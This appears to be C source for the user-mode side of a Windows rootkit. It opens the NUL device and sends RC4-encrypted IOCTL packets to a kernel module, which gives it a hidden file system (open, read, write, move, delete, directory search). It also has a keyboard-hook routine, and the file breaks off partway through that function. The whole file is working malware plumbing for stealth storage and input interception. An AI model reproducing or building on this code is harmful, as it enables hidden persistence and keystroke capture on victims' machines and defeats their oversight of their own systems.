#include <Windows.h>
#include <tchar.h>
#include <intrin.h>
#include <strsafe.h>

#define SYS_ALLOCATOR(sz) VirtualAlloc(0, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
#define SYS_DEALLOCATOR(ptr) VirtualFree(ptr,0, MEM_DECOMMIT|MEM_RELEASE)

#include "../../../../shared_code/platform.h"
#include "../../../../shared_code/types.h"
#include "../../../../shared_code/native.h"
#include "../../../mod_shared/userio.h"

#include "zuserio.h"

#include "../../../../shared_code/arc4.c"

static uint8_t g_rc4Key[CLIENT_KEY_SIZE];
static uint8_t g_clientId[CLIENT_ID_SIZE];
static HANDLE g_ZfsHandle = NULL;

int zuserio_init(unsigned char key[CLIENT_KEY_SIZE], unsigned char clientId[CLIENT_ID_SIZE])
{
    __movsb(g_rc4Key, key, sizeof(g_rc4Key));
    __movsb(g_clientId, clientId, sizeof(g_clientId));
    g_ZfsHandle = CreateFile(TEXT("\\\\.\\NUL"), FILE_READ_ACCESS, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    return (g_ZfsHandle != INVALID_HANDLE_VALUE) ? 0 : 1;
}

void zuserio_shutdown()
{
    if (g_ZfsHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_ZfsHandle);
    }
}

pfile_data_t zfs_prepare_request_data(pfile_packet_t* ppFilePacket, uint32_t inSize, uint32_t opID)
{
    pfile_packet_t pFilePacket;

    pFilePacket = (pfile_packet_t)SYS_ALLOCATOR(sizeof(file_packet_t) + inSize);
    if (pFilePacket == NULL) {
        return NULL;
    }

    MEMSET(pFilePacket, 0, sizeof(file_packet_t) + inSize);
    pFilePacket->signature = REQUEST_SIGNATURE;
    pFilePacket->dataSize = inSize + 1;
    pFilePacket->operation = opID;
    __movsb(pFilePacket->clientId, g_clientId, sizeof(g_clientId));

    *ppFilePacket = pFilePacket;
#ifdef _DEBUG
    {
        char output[260];

        StringCchPrintfA(output, sizeof(output), " [zfs_prepare_request_data] signature: %04X; data size: %u; id: %u\n", REQUEST_SIGNATURE, pFilePacket->dataSize, opID);
        OutputDebugStringA(output);
    }
#endif // _DEBUG

    return (pfile_data_t)pFilePacket->data;
}

int zfs_mkdir(char* dirName)
{
    DWORD dwResult;
    int ret = ZFS_MKDIR | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (dirName == NULL) {
        return ZFS_MKDIR | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_zfs_mkdir_id) == NULL) {
        return ZFS_MKDIR | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    StringCchCopyA((char*)pFilePacket->data, MAX_PATH, dirName);

#ifdef _DEBUG
    {
        char output[260];

        StringCchPrintfA(output, sizeof(output), " [zfs_mkdir] file name: %s\n", pFilePacket->data);
        OutputDebugStringA(output);
    }
#endif // _DEBUG

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_MKDIR, NULL, 0, pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_MKDIR | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_rmdir(char* dirName)
{
    DWORD dwResult;
    int ret = ZFS_RMDIR | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (dirName == NULL) {
        return ZFS_RMDIR | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_zfs_rmdir_id) == NULL) {
        return ZFS_RMDIR | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    StringCchCopyA((char*)pFilePacket->data, MAX_PATH, dirName);

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_RMDIR, NULL, 0, pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_RMDIR | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_putc(zfs_handle_t handle, unsigned char ch)
{
    DWORD dwResult;
    int ret = ZFS_PUTC | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0) {
        return ZFS_PUTC | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, 0, userio_zfs_putc_id) == NULL) {
        return ZFS_PUTC | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;
    pFilePacket->data[0] = ch;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_PUTC, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_PUTC | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_write(zfs_handle_t handle, unsigned char* buffer, unsigned int size, unsigned int* pWritten)
{
    DWORD dwResult;
    int ret = ZFS_WRITE | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0 || buffer == NULL) {
        return ZFS_WRITE | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, size - 1, userio_zfs_write_id) == NULL) {
        return ZFS_WRITE | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;
    MEMCPY(pFilePacket->data, buffer, size);

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + size - 1, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_WRITE, NULL, 0, pFilePacket, sizeof(file_packet_t) + size - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + size - 1, g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
            if (pWritten != NULL) {
                *pWritten = pFilePacket->param1;
            }
        }
        else {
            ret = ZFS_WRITE | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_iseof(zfs_handle_t handle)
{
    DWORD dwResult;
    int ret = ZFS_ISEOF | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0) {
        return ZFS_ISEOF | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, 0, userio_zfs_iseof_id) == NULL) {
        return ZFS_ISEOF | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_data_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_ISEOF, 0, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_data_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_ISEOF | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_getc(zfs_handle_t handle)
{
    DWORD dwResult;
    int ret = ZFS_GETC | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0) {
        return ZFS_GETC | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, 0, userio_zfs_getc_id) == NULL) {
        return ZFS_GETC | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_data_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_GETC, 0, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_data_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_GETC | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_getline(zfs_handle_t handle, char* buffer, int maxSize)
{
    DWORD dwResult;
    int ret = ZFS_GETLINE | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (buffer == NULL || buffer == NULL) {
        return ZFS_GETLINE | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, maxSize - 1, userio_zfs_getline_id) == NULL) {
        return ZFS_GETLINE | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_data_t) + maxSize - 1, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_GETLINE, NULL, 0, pFilePacket, sizeof(file_packet_t) + maxSize - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_data_t) + maxSize - 1, g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
            MEMCPY(buffer, pFilePacket->data, maxSize);
        }
        else {
            ret = ZFS_GETLINE | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_read(zfs_handle_t handle, unsigned char* buffer, unsigned int size, unsigned int* pReaded)
{
    DWORD dwResult;
    int ret = ZFS_READ | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (buffer == NULL || buffer == NULL) {
        return ZFS_READ | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, size - 1, userio_zfs_read_id) == NULL) {
        return ZFS_READ | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;
    
    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + size - 1, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_READ, NULL, 0, pFilePacket, sizeof(file_packet_t) + size - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + size - 1, g_rc4Key, sizeof(g_rc4Key));
            ret = ((pfile_packet_t)pFilePacket)->errCode;
            if (pReaded != NULL) {
                *pReaded = pFilePacket->param1;
            }
            MEMCPY(buffer, pFilePacket->data, size);
        }
        else  {
            ret = ZFS_READ | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_findfirst(char* pathName, pzfs_dir_entry_t pDirent)
{
    DWORD dwResult;
    int ret = ZFS_FINDFIRST | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;
    pfile_data_t pFileData;

    if (pathName == NULL || pDirent == NULL) {
        return ZFS_FINDFIRST | ZFS_ERR_NULL_POINTER;
    }

    if ((pFileData = zfs_prepare_request_data(&pFilePacket, sizeof(file_data_t) + sizeof(zfs_dir_entry_t) - 2, userio_zfs_findfirst_id)) == NULL) {
        return ZFS_FINDFIRST | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    StringCchCopyA(pFileData->fileName, MAX_PATH, pathName);
    pFileData->dataSize = sizeof(zfs_dir_entry_t);
    MEMCPY(pFileData->data, pDirent, sizeof(zfs_dir_entry_t));

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + sizeof(file_data_t) + sizeof(zfs_dir_entry_t) - 2, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_FINDFIRST, NULL, 0, pFilePacket, sizeof(file_packet_t) + sizeof(file_data_t) + sizeof(zfs_dir_entry_t) - 2, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + sizeof(file_data_t) + sizeof(zfs_dir_entry_t) - 2, g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
            MEMCPY(pDirent, pFileData->data, sizeof(zfs_dir_entry_t));
        }
        else {
            ret = ZFS_FINDFIRST | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_findnext(pzfs_dir_entry_t pDirent)
{
    DWORD dwResult;
    int ret = ZFS_FINDNEXT | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (pDirent == NULL) {
        return ZFS_FINDNEXT | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, sizeof(zfs_dir_entry_t) - 1, userio_zfs_findnext_id) == NULL) {
        return ZFS_FINDNEXT | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    MEMCPY(pFilePacket->data, pDirent, sizeof(zfs_dir_entry_t));

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + sizeof(zfs_dir_entry_t) - 1, g_rc4Key, sizeof(g_rc4Key));
    
    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_FINDNEXT, NULL, 0, pFilePacket, sizeof(file_packet_t) + sizeof(zfs_dir_entry_t) - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + sizeof(zfs_dir_entry_t) - 1, g_rc4Key, sizeof(g_rc4Key));
            ret = ((pfile_packet_t)pFilePacket)->errCode;
            MEMCPY(pDirent, pFilePacket->data, pFilePacket->dataSize);
        }
        else {
            ret = ZFS_FINDNEXT | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_move(char* srcPath, char* dstPath)
{
    DWORD dwResult;
    int ret = ZFS_MOVE | ZFS_ERR_DEVIO_FAILED;
    pfile_data_t pFileData;
    pfile_packet_t pFilePacket;

    if (srcPath == NULL || dstPath == NULL) {
        return ZFS_MOVE | ZFS_ERR_NULL_POINTER;
    }

    if ((pFileData = zfs_prepare_request_data(&pFilePacket, sizeof(file_data_t) + MAX_PATH - 2, userio_zfs_move_id)) == NULL) {
        return ZFS_MOVE | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFileData->dataSize = MAX_PATH;
    StringCchCopyA(pFileData->fileName, MAX_PATH, srcPath);
    StringCchCopyA((char*)pFileData->data, MAX_PATH, dstPath);

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + sizeof(file_data_t) + MAX_PATH - 2, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_MOVE, NULL, 0, pFilePacket, sizeof(file_packet_t) + sizeof(file_data_t) + MAX_PATH - 2, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_MOVE | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_open(zfs_handle_t* pHandle, char* fileName, unsigned char flags)
{
    DWORD dwResult;
    int ret = ZFS_OPEN | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (pHandle == NULL || fileName == NULL) {
        return ZFS_OPEN | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_zfs_open_id) == NULL) {
        return ZFS_OPEN | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    StringCchCopyA((char*)pFilePacket->data, MAX_PATH, fileName);
    pFilePacket->param1 = (uint32_t)flags;

#ifdef _DEBUG
    {
        char output[260];

        StringCchPrintfA(output, sizeof(output), " [zfs_open] file name: %s; flags: %u\n", pFilePacket->data, pFilePacket->param1);
        OutputDebugStringA(output);
    }
#endif // _DEBUG
	
    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_OPEN, NULL, 0, pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
            *pHandle = pFilePacket->handle;
        }
        else {
            ret = ZFS_OPEN | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_checkvalid(zfs_handle_t handle)
{
    DWORD dwResult;
    int ret = ZFS_CHECKVALID | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0) {
        return ZFS_CHECKVALID | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, 0, userio_zfs_checkvalid_id) == NULL) {
        return ZFS_CHECKVALID | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_CHECKVALID, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_CHECKVALID | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_close(zfs_handle_t handle)
{
    DWORD dwResult;
    int ret = ZFS_CLOSE | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0) {
        return ZFS_CLOSE | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, 0, userio_zfs_close_id) == NULL) {
        return ZFS_CLOSE | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;
    
    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_CLOSE, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_CHECKVALID | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_tell(zfs_handle_t handle, unsigned int* pFilePtr)
{
    DWORD dwResult;
    int ret = ZFS_TELL | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0 || pFilePtr == NULL) {
        return ZFS_TELL | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, 0, userio_zfs_tell_id) == NULL) {
        return ZFS_TELL | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;
    
    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_TELL, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
            *pFilePtr = pFilePacket->param1;
        }
        else {
            ret = ZFS_TELL | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_seek(zfs_handle_t handle, int filePtr, unsigned char origin)
{
    DWORD dwResult;
    int ret = ZFS_SEEK | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0) {
        return ZFS_SEEK | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, 0, userio_zfs_seek_id) == NULL) {
        return ZFS_SEEK | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;
    pFilePacket->param1 = (uint32_t)filePtr;
    pFilePacket->data[0] = origin;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_SEEK, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_SEEK | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_unlink(char* fileName)
{
    DWORD dwResult;
    int ret = ZFS_UNLINK | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (fileName == NULL) {
        return ZFS_UNLINK | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_zfs_unlink_id) == NULL) {
        return ZFS_UNLINK | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    StringCchCopyA((char*)pFilePacket->data, MAX_PATH, fileName);

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_UNLINK, NULL, 0, pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_SEEK | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

/** Получает время создания файла. */
int zfs_get_time(char* fileName, unsigned int aWhat, unsigned int* uTime)
{
    DWORD dwResult;
    int ret = ZFS_GETTIME | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (fileName == NULL || uTime == NULL) {
        return ZFS_GETTIME | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_zfs_get_time_id) == NULL) {
        return ZFS_GETTIME | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    StringCchCopyA((char*)pFilePacket->data, MAX_PATH, fileName);
    pFilePacket->param1 = aWhat;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_GET_TIME, NULL, 0, pFilePacket, sizeof(file_packet_t) + MAX_PATH - 1, &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
            *uTime = pFilePacket->param1;
        }
        else {
            ret = ZFS_GETTIME | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

/** Получает версию ядерного модуля. */
int zfs_get_version()
{
    DWORD dwResult;
    int ret = ZFS_GETVERSION | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (zfs_prepare_request_data(&pFilePacket, 0, userio_zfs_get_version_id) == NULL) {
        return ZFS_GETVERSION | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_GET_VERSION, NULL, 0, pFilePacket,sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_GETVERSION | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_get_filesize(zfs_handle_t handle, unsigned int* pFileSize)
{
    DWORD dwResult;
    int ret = ZFS_GETFILESIZE | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0 || pFileSize == NULL) {
        return ZFS_GETFILESIZE | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_zfs_get_filesize_id) == NULL) {
        return ZFS_GETFILESIZE | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_GET_FILESIZE, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            *pFileSize = pFilePacket->param1;
            ret = 0;
        }
        else  {
            ret = ZFS_GETFILESIZE | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int zfs_set_end_of_file(zfs_handle_t handle)
{
    DWORD dwResult;
    int ret = ZFS_SETENDOFFILE | ZFS_ERR_DEVIO_FAILED;
    pfile_packet_t pFilePacket;

    if (handle == 0) {
        return ZFS_SETENDOFFILE | ZFS_ERR_NULL_POINTER;
    }

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_zfs_setendoffile_id) == NULL) {
        return ZFS_SETENDOFFILE | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->handle = handle;

    arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));

    if (!DeviceIoControl(g_ZfsHandle, IOCTL_USERIO_ZFS_SET_END_OF_FILE, NULL, 0, pFilePacket, sizeof(file_packet_t), &dwResult, 0)) {
        if (GetLastError() == ERROR_OPERATION_ABORTED) {
            arc4_crypt_self((uint8_t*)pFilePacket, sizeof(file_packet_t), g_rc4Key, sizeof(g_rc4Key));
            ret = pFilePacket->errCode;
        }
        else {
            ret = ZFS_SETENDOFFILE | ZFS_ERR_UNSUPPORTED_OPERATION;
        }
    }

    SYS_DEALLOCATOR(pFilePacket);

    return ret;
}

int __stdcall userio_keyboard_hook(int setHook)
{
    DWORD dwResult;
    pfile_packet_t pFilePacket;
    int ret = ZFS_KEYBBLOCK | ZFS_ERR_DEVIO_FAILED;

    if (zfs_prepare_request_data(&pFilePacket, MAX_PATH - 1, userio_keyb_hook_id) == NULL) {
        return ZFS_KEYBBLOCK | ZFS_ERR_NOT_ENOUGH_MEMORY;
    }

    pFilePacket->param1 = (uint32_t)setHook;

